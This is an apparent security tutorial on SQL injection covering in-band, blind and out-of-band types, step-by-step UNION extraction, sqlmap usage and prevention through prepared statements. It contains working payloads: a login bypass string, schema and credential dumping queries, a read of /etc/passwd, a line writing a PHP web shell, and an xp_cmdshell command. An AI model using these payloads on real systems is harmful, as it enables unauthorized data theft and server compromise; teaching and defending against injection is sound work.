# SQL Injection

SQL injection has been on the OWASP Top 10 for most of its existence, and despite being one of the oldest and most well-documented vulnerability classes, it still shows up everywhere. The premise is simple: user input ends up interpreted as SQL code rather than data. The consequences range from authentication bypass to full server compromise.

## How It Works

A web application typically constructs a SQL query by concatenating strings. When user input is dropped directly into that string without sanitization, an attacker can break out of the intended context and inject arbitrary SQL.

The classic login form example:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'hunter2';
```

Now imagine the username field accepts this input: `' OR '1'='1`

The query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```

Because `'1'='1'` is always true, this returns rows regardless of what password was supplied. The application sees a valid result, assumes login succeeded, and hands over the session. No credentials required.

## Types of SQL Injection

### In-Band

The results come back through the same channel as the request, which makes exploitation straightforward.

**Error-based** injection relies on the database throwing verbose error messages that leak schema details. For example, some databases will include the result of a subquery inside an error message. This is why suppressing detailed database errors in production matters.

**Union-based** injection is the workhorse technique for data extraction. By appending a `UNION SELECT` statement, you can pull data from arbitrary tables and return it alongside the original query's results.

### Blind

The application doesn't return query results or errors directly. You have to infer information indirectly.

**Boolean-based blind**: The page behaves slightly differently depending on whether a condition is true or false. Attackers exploit this to extract data one bit at a time by asking yes/no questions: "Is the first character of the admin password greater than 'M'?"

**Time-based blind**: No visible difference in the response at all, but you can inject a `SLEEP()` (MySQL) or `WAITFOR DELAY` (MSSQL) call. If the page takes five seconds longer to respond when a condition is true, you can still extract data, just slowly.

### Out-of-Band

The injected query causes the database to make an outbound network connection carrying the extracted data, often via DNS. This sidesteps cases where the HTTP response gives you nothing. It requires the database server to have outbound network access, which is more common than it should be.

## UNION-Based Extraction in Detail

To use UNION, your injected SELECT needs to return the same number of columns as the original query, with compatible types. The process:

**Step 1: Find the column count.** Add ORDER BY clauses and increment until the query errors:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- errors here, so there are 2 columns
```

Or use NULL padding:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2: Find a visible column.** Not all columns render on screen. Replace NULLs with strings to find one that appears:

```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

**Step 3: Extract data.** Now pull what you actually want:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username, password FROM users--
```

## What's Actually at Risk

Authentication bypass is the obvious one, but the impact goes much further.

**Data exfiltration**: With UNION-based or blind injection you can systematically dump entire tables, including password hashes, PII, API keys, whatever is in the database.

**File system access**: MySQL's `LOAD_FILE()` function can read files from the server's filesystem (subject to permissions and `secure_file_priv` settings). `INTO OUTFILE` can write files, which is a path to dropping a web shell.

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--
```

**OS command execution**: Microsoft SQL Server has `xp_cmdshell`, a stored procedure that executes shell commands and returns the output. It's disabled by default in modern versions but can be re-enabled if the database user has sufficient privileges:

```sql
'; EXEC xp_cmdshell('whoami');--
```

The takeaway is that a SQL injection vulnerability doesn't just expose the database. Depending on configuration and privileges, it can be a direct path to the underlying operating system.

## Tools: sqlmap

sqlmap automates detection and exploitation of SQL injection. It handles column count enumeration, database fingerprinting, data extraction, and a lot more. It's genuinely useful for testing, but it's worth understanding the manual techniques first. Running sqlmap without knowing what it's doing means you won't recognize its output, won't be able to explain your findings, and won't catch things it misses.

Use it responsibly and only against systems you have explicit permission to test.

```bash
sqlmap -u "https://target.com/items?id=1" --dbs
sqlmap -u "https://target.com/items?id=1" -D targetdb --tables
sqlmap -u "https://target.com/items?id=1" -D targetdb -T users --dump
```

## Prevention

### Parameterized Queries (The Actual Fix)

The root cause is mixing code and data. Parameterized queries, also called prepared statements, separate them completely. The query structure is sent to the database first, and user input is passed as parameters afterward. The database treats parameters as pure data; they can never be interpreted as SQL syntax.

**Vulnerable PHP:**

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

**Safe PHP with prepared statements:**

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_POST['username']);
$stmt->execute();
```

**Vulnerable Python:**

```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

**Safe Python:**

```python
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

This pattern works in every major language and every major database. There's no excuse not to use it for new code.

### Input Validation

Parameterization should be your primary control. Input validation is a useful secondary layer, not a substitute. Validate that data matches expected types and formats: if a field expects an integer, reject anything that isn't. But don't rely on blocklists of SQL keywords; attackers have more bypass tricks than you have patience for maintaining a list.

### Least Privilege Database Accounts

The application's database account should have only the permissions it actually needs. A read-only reporting page should connect with a read-only account. Nothing in a normal web application needs `FILE` privileges or the ability to execute stored procedures that run OS commands. If the worst happens and injection is exploited, a least-privilege account limits the blast radius significantly.

### WAFs

Web Application Firewalls can detect and block common SQL injection patterns. They're a useful layer, but not a substitute for fixing the underlying vulnerability. WAF rules can be bypassed, especially with encoding tricks, comment injection, and less common SQL syntax. Fix the code; use the WAF as defense in depth.
